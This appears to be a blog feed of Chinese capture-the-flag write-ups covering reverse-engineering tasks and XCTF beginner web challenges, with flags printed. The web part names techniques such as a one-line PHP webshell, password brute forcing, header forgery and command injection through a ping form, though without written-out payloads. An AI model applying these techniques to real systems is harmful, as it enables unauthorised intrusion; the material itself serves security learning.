设置成debug，pwntools会将所有io数据等输出，方便编写poc的时候进行调试，而arch可以设置攻击目标的指令构架。</span></span><br></pre></td></tr></table></figure><p>大致的说说了pwntools的使用，以及一些常用的函数和模块，</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1808053189&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>simple-check-100 &amp; Windows_Reverse1 &amp; gametime</title>
      <link href="posts/c48f7af2/"/>
      <url>posts/c48f7af2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h1><p>我们可以看到这个是个压缩包，那我们就解压，发现有三个文件，就按exe文件来进行分析。<br><img src="https://img-blog.csdnimg.cn/20210107195706667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来打开ida进行分析一下：<br><img src="https://img-blog.csdnimg.cn/20210107200013219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就看看着两个函数分别是什么？<br>check_key这个就是核实我们所输入的数据是否正确。<br>此时我们可以有两个思路，我们可以动态调试，这样是很简单的。<br>我们打开Ollydbg运行到check_key这个函数，修改eax里的值为1，但出现的是一堆乱码：<br><img src="https://img-blog.csdnimg.cn/2021010720131566.png" alt="在这里插入图片描述"><br>所以说OD可能不行，因为给了三个文件，我们可以用dbg来进行调试。<br><img src="https://img-blog.csdnimg.cn/20210107203519950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时一直运行到check_key这里，期间我们随便输入一个key值就行了。<br><img src="https://img-blog.csdnimg.cn/20210107205135570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后运行到结束就可以了，我们就能得到flag了。<br><img src="https://img-blog.csdnimg.cn/20210107205208635.png" alt="在这里插入图片描述"><br>flag就找到了。<br>这道题还有不同的解法，如ida的远程调试，或者静态分析，它之所以给了三个文件，就说明了有不同的解法。<br>后来发现ida上的调试好像也不行，会出乱码。</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这道题我们可以再次学到如何用gdb调试，先用b main下到主函数断点，再n一步一步运行，再在eax中修改值（set ￥eax=1）然后c运行到结尾。</p><hr /><h1 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h1><p>根据题目明显是个Windows下的逆向，文件是个exe的文件。<img src="https://img-blog.csdnimg.cn/20210111160747432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>信息上并没有太多的用处，但是有个ups的加壳，所以我们需要进行对它脱壳。<img src="https://img-blog.csdnimg.cn/20210111161540800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我用的是kali，因为我的windows下是没有装upx脱壳工具的。此时我们再用ida打开就能找到main函数了。<img src="https://img-blog.csdnimg.cn/20210111161949886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时我们就可以去sub_401000这个函数里看看到底有些什么个东西。<br><img src="https://img-blog.csdnimg.cn/20210111162356934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是我们是没有办法去找到这个byte_402FF8的具体值。而在字符串里面我们可以有点思路：<img src="https://img-blog.csdnimg.cn/20210111163628379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然我们静态没有办法了，就动态调试一下。不过，我们还是先来仔细分析一下伪代码，切记，伪代码其实是会编译错误的，我们来看是会发现v1是个地址，v4是a1与v1的地址差，而后面出现了byte_402FF8[(char)v1[v4]]这个，里面是个v1[v4]这个，它又是个什么东西呢？其实就是v1+v4这个值，那么byte_402FF8的索引里的值这个其实就是我们所输入的。<br>我们就需要找到byte_402FF8这个数组里面的值就可以了。然后我又去查看了一下byte_402FF8这个值。<br><img src="https://img-blog.csdnimg.cn/20210111183513630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里出现的字符是与我们先前查看的字符串里对应住了，那为什么前面是？号呢？因为ascll码值前面的数值是没有具体字符表示的。<br>OD打开的发现了出现了反常的一些东西。<br>既然如此，那我们只好硬着头皮上去看看代码静态分析了，然后我将byte_402FF8这个值全部审查了一遍：<br><img src="https://img-blog.csdnimg.cn/20210111193526237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后它们就是靠这这个表来进行检查的，这个表的内容和所在的位数，就构成了一个检查。<img src="https://img-blog.csdnimg.cn/20210111200431466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个时候我竟然有了一点迷惑，不知道这个是不是乱码，后来看到了题目的提示：提交的flag形式为flag{XXXX}<br>然后flag就是flag{ZZ[JX#,9(9,+9QY!}这个东西了。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>这道题还是有点难度的，这里主要涉及到了一个地方：<br>*v1 = byte_402FF8[(char)v1[v4]]<br>这里的v1[v4]看着是两个地址，一个地址为另一个地址的索引，其实这里是伪代码出错了，它具体应该是v1+v4这样子了。涉及到指针ida就可能（一定）会出错，所以我们需要多做这类的题目，将我们做的记录下来，多了就成了我们的自我经验了。</p><hr /><h1 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h1><p>看题目描述是个游戏时间，应该有关游戏的，下载是个exe文件，运行起来有点看不懂，那我们先记录下来里面的一些字符，等反编译时去针对性的查看。<img src="https://img-blog.csdnimg.cn/20210112140144144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里的文件查看是没有得到什么信息的，那我们就用ida打开它去看看里面到底是些什么：<br>（伪代码有点长，我们就一段一段的来分析）<br><img src="https://img-blog.csdnimg.cn/20210112140905818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而下面这个函数sub_4012D5(0xC8u)则是它输入的下面的一串字符。<br><img src="https://img-blog.csdnimg.cn/20210112144206581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码有点长，不过此时我们其实就应该可以想到这道题可能用到了动态调试了，不过我们还是要找到我们所需的代码处。后来也看不下了，实在有点多，不过下面的key应该是flag了，我们就要得到它就行了。<img src="https://img-blog.csdnimg.cn/20210112152151945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后程序中就出现了：<br><img src="https://img-blog.csdnimg.cn/20210112152236861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子flag就得到了，不过一直运行起来挺费时间的，我们一不小心就又得重来。</p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>这道题就是考察OD，不过刚开始确实不容易想出了，因为我刚开始就不知道它这个到底是说明意思，后来才发现s和m出现的太快以至于我根本没有看到，所以我们要静态和动态结合起来来看！<br>知识点上并没有什么要说的。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1808492017&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debug &amp; Guess-the-Number &amp; EasyRE</title>
      <link href="posts/168f0d6d/"/>
      <url>posts/168f0d6d/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h1><p>看到了这个exe文件（不错，又来个exe）<br>那就先运行一下看看是个什么东东？很简单，什么都没有。<br><img src="https://img-blog.csdnimg.cn/20210103121632785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先来个基本信息压压惊，再来个ida打开（发现没有办法反编译）然后我想的是看看汇编语言来进行逆向，不过找到了flag却没办法弄出来，所以弄个dnspy这个软件。<br>用dnspy这个打开，运行到入口点即可看到源码，我们找到wrong设置断点，运行一下，看看内存里面有没有我们想要的东西：<br><img src="https://img-blog.csdnimg.cn/20210103125702619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样就可以了得到flag了。<br>这道题就是让我们知道一下.net这样的程序怎么来进行反编译的。</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>dnSpy是一款针对.NET程序的逆向工程工具。开发人员可以使用它反编译.NET代码，了解到它是如何工作的，以便学习或指导。</p><hr /><h1 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h1><p>我们可以看到题目的要求为：<br><img src="https://img-blog.csdnimg.cn/20210105191033280.png" alt="在这里插入图片描述"><br>并且它是个java的代码，我们就要用到java的反编译工具了（JD-GUI）<br><img src="https://img-blog.csdnimg.cn/20210105191733147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子我们就有了点思路了。只要把加密方式搞懂就可以得到flag了（或者直接修改代码，或运行代码来进行解密）。此时我们要注意几个点：一个是guess_number = Integer.parseInt(args[0]);它的意思就是将字符串转成整型（可以理解成强制转换）<br>然后命令行中进行运行尝试：<br><img src="https://img-blog.csdnimg.cn/2021010519354542.png" alt="在这里插入图片描述"><br>这样子运行一下就得到flag了，也许逆会问到309137378这个怎么来的？它就是判断语句了，<br>if (my_number / 5 == guess_number) {<br>int my_number = 1545686892;（这个数据我们也知道了）<br>那么309137378就是1545686892除于3咯咯！！！</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>《JD-GUI》是一款反编译软件，JD分为JD-GUI、JD-Eclipse两种运行方式，JD-GUI是以单独的程序的方式运行，JD-Eclipse则是以一个Eclipse插件的方式运行。<br>java：<br> / * try catch：自己处理异常</p><ul><li>try {</li><li>可能出现异常的代码</li><li>} catch（异常类名A e）{</li><li>如果出现了异常类A类型的异常，那么执行该代码</li><li>} …（catch可以有多个）</li><li>finally {</li><li>最终肯定必须要执行的代码（例如释放资源的代码）</li><li>}*/</li></ul><hr /><h1 id="EasyRE"><a href="#EasyRE" class="headerlink" title="EasyRE"></a>EasyRE</h1><p>是个exe文件，用ida打开，发现没有Functions name里面是找不到main函数的（特别像打比赛，里面的很多逆向题都是如此，不让你找到主函数）那此时就通过搜索字符串进行确定主函数的所在位置。<br><img src="https://img-blog.csdnimg.cn/20210106185518478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后一通分析，知道了我们想要的加密。<br>(const char *)&amp;unk_402124而这个是xIrCj<del>&lt;r|2tWsv3PtI\x7Fzndka<br>这一同字符。<br>我们再来看它有两个do</del>while循环，第一个就是将byte_40336C这里的数据里储存v7逆序的字符。<br>而我们再来根据第二个do~while来进行解密就可以了。<br><img src="https://img-blog.csdnimg.cn/20210106191355251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时flag就得到了。</p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>这道题如以往的一样，没有什么太大的难度。而知识点也没有什么要说的。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1807537867&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web新手区</title>
      <link href="posts/37bc40c7/"/>
      <url>posts/37bc40c7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="view-sourse"><a href="#view-sourse" class="headerlink" title="view_sourse"></a>view_sourse</h3><p>第一题是最简单的，直接F12就可以了；F12是可以打开页面源代码的，也可以在设置中找到；<br><img src="https://img-blog.csdnimg.cn/20210304172130709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>第二道题也算是简单的，网上其实有太多的题解，这个直接在网址后加上   <strong><em>/robots.txt</em></strong> 就行了。<br><strong>百度下</strong>：robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<br>就知道是个文本行了。<br><img src="https://img-blog.csdnimg.cn/20210304172456433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子flag就得到了 <strong>cyberpeace{e9ae1d9e587b8fbfe5c113a090bf28be}</strong></p><hr /><h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>第三题根据提示，知道是个备份文件，然后再网址后面加上/index.php.bak就自动下载了个文件，然后用记事本打开就行了。index.php的后缀名是bak，但如果遇到其它的，后缀名就不一定是bak了<br><img src="https://img-blog.csdnimg.cn/20210304172803769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用记事本打开是个代码：<br><img src="https://img-blog.csdnimg.cn/20210304172909862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子这道题就做出来了。</p><hr /><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>这题提示看cookie，那我们肯定打开cookie.php这个文件，方法和上面的一样，再网址后面加上cookie.php就可以访问了，然后它又来了个提示，看看反应。<br>可能我们有点懵，但不要着急，再这里我们还用不到Burpsute,(或许你还不知道这是什么，但不要着急，用到了再说)直接打开开发者工具（按F12就行了）然后看看network，找到cookie.php的目录，里面就可以看到了flag这个小可爱了！<br><img src="https://img-blog.csdnimg.cn/20210304173335348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们再找到cookie这个文件（直接再url里加上它就可以了）<br>此时里面有个提示See the http response<br>我们就看看：<br><img src="https://img-blog.csdnimg.cn/20210304173505929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这样子flag就得了。</p><hr /><h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>我们可以发现这个按钮按不下去，如果我们让它按了下去，那我们是不是就可以得到了falg，那根据前面学到的知识，按F12，发现了个disabled这个（在from中,而from是表格的意思！）右键删除它，然后点它，flag就出现了。<br><img src="https://img-blog.csdnimg.cn/202103041738209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就出现了，很简单啦</p><hr /><h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>这个是个登录页面，而且不限次数，我们就可以用爆破这个了。<br><img src="https://img-blog.csdnimg.cn/20210304173953568.png" alt="在这里插入图片描述"><br>我们随手输入一个账号登录一下，发现有个提示，账号是admin，密码不知道，我们就需要爆破密码了。这时我们就需要一个字典，根据字典来进行爆破它。<img src="https://img-blog.csdnimg.cn/20210304175912534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后是根据长度来进行判断的，然后就可以找出密码是123456啦<br><strong>cyberpeace{133de6452c95de2f229220105726395e}</strong></p><hr /><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>这里就是php代码的审计啦。<img src="https://img-blog.csdnimg.cn/20210304180456556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们就想一想，有什么可以代替他们，嗯嗯~~<br>0a和1234a，因为一个字符串刚开头就决定了它是什么类型的。<br>改一下url就行了。<br><strong><em>Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}</em></strong></p><hr /><h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><p>新手区的题是比较简单的，这个也是一步就完成的，两个请求就OK啦。<img src="https://img-blog.csdnimg.cn/20210304181335862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就好了</p><hr /><h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>这个就是伪造一下里面的内容啦。<br><img src="https://img-blog.csdnimg.cn/2021030418145926.png" alt="在这里插入图片描述"><br>BP上啦：<br>不过说一下hacker这个插件也可以直接做出来，不过我们就不用这个啦。<img src="https://img-blog.csdnimg.cn/20210304183029115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过我发现这个BP确实有电难用呀，一卡一卡的。</p><hr /><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>这个就是 <strong>一句话木马</strong> 啦！<br><img src="https://img-blog.csdnimg.cn/2021030418342313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一下子就可以了。<br>也可以用菜刀或者蚁剑啦！</p><hr /><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>用个ping，其实我也不太懂什么是ping，我的理解是你发个请求差不多，它会个你个回应的。可以百度下。<br><img src="https://img-blog.csdnimg.cn/20210304184123596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们就要打印出这个flag.txt这个文档啦。<br><img src="https://img-blog.csdnimg.cn/20210304184411182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子flag就出来了。</p><hr /><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>这个应该与js有关啦！<br><img src="https://img-blog.csdnimg.cn/20210304185150469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实这串数字就是flag啦，不过的转成字符，发现是个数组，再进行一次转成字符就是flag啦。<br><strong>786OsErtk12</strong><br>这个加上Cyberpeace就是flag啦。<br>也可以用记事本来进行改代码啦！直接复制粘贴改，总会改对的。</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1824041258&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>re1-100 &amp; 666 &amp; IgniteMe</title>
      <link href="posts/738146b4/"/>
      <url>posts/738146b4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h1><p>先来简单看下信息，了解一下这个文件的信息。<br><img src="https://img-blog.csdnimg.cn/20201231212849829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后用ida打开：<img src="https://img-blog.csdnimg.cn/20201231222059162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后大致找一下，看看主体部分，然后再看看下面的辅助信息：<br><img src="https://img-blog.csdnimg.cn/20201231223027979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们就去看看confuseKey这个关键函数到底是些什么内容：<br><img src="https://img-blog.csdnimg.cn/202012312232424.png" alt="在这里插入图片描述"><br>那flag就是53fc275d81053ed5be8cdaf29f59034938ae4efd这个东西了，这道题不算太难。</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这道题主要还是分析函数，其它没有什么要讲的。</p><hr /><h1 id="666"><a href="#666" class="headerlink" title="666"></a>666</h1><p>刚开始一定是看看信息了：<br><img src="https://img-blog.csdnimg.cn/20210101124812278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再用ida打开，去看看到底在弄什么名堂，说什么666（哈哈哈）<br><img src="https://img-blog.csdnimg.cn/20210101125233134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那我们就再看看它的伪代码，来仔细分析一下里面的程序：<br><img src="https://img-blog.csdnimg.cn/20210101130436399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" 